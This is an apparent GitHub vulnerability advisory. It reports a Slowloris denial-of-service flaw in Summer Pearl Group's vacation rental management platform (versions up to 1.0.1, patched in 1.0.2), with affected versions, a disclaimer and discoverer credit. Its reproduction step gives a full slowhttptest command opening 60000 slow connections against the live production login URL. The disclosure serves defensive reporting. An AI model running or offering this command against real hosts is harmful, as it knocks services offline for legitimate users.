<table>
  <tr>
    <td width="150" rowspan="2">
      <a href="https://summerpearlgroup.gr" target="_blank">
        <img src="https://github.com/Stolichnayer/Summer-Pearl-Group-IDOR-XSS/raw/main/logo.png" alt="Summer Pearl Logo" width="120"/>
      </a>
    </td>
    <td>
      <h1>Summer Pearl Group</h1>
      <h3>Vacation Rental Management Platform Vulnerability</h3>
    </td>
  </tr>
  <tr>
    <td>
      <table>
        <tr>
          <td>
            🌐 <a href="https://summerpearlgroup.gr" target="_blank">Main Site</span></a>
          </td>
          <td style="padding-left: 15px;">
            🚀 <a href="https://summerpearlgroup.gr/spgpm/releases" target="_blank">Release Notes</span></a>
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>

## Slowloris Denial-of-Service (DoS) Vulnerability

## 📜 Description
**Summer Pearl Group's Vacation Rental Management Platform** versions prior to **1.0.2** are susceptible to a **Slowloris-style Denial-of-Service (DoS)** condition in the HTTP connection handling layer, where an attacker that opens and maintains many slow or partially-completed HTTP connections can exhaust the server’s connection pool and worker capacity, preventing legitimate users and APIs from accessing the service.

## 🔍 Affected Versions

| Status       | Version         |
|--------------|-----------------|
| 🔴 Vulnerable | ≤ `v1.0.1`     |
| 🟢  Fixed     | &nbsp;&nbsp;&nbsp; `v1.0.2`        |

## ⚠️ Disclaimer
This project is intended for **educational and ethical research purposes only**. Unauthorized testing on systems without explicit permission is illegal. Use responsibly and only on systems you own or have permission to test.

## :triangular_flag_on_post: Steps to Reproduce

### 1️⃣ Install "slowhttptest" tool

### 2️⃣ Use the following command
```
slowhttptest -c 60000 -B -g -o slowhttp -i 10 -r 60000 -t GET -u https://summerpearlgroup.gr/spgpm/login
```

## 🧑‍💻 Discovery
The vulnerability was discovered by **Alex Perrakis (Stolichnayer)**.

## 🔗 **References:**
- [Summer Pearl Group](https://summerpearlgroup.gr/spgpm/portal)
- [Vacation Rental Management Platform](https://summerpearlgroup.gr/spgpm/login)
- [Release v1.0.2 Notes (Patch)](https://summerpearlgroup.gr/spgpm/releases)

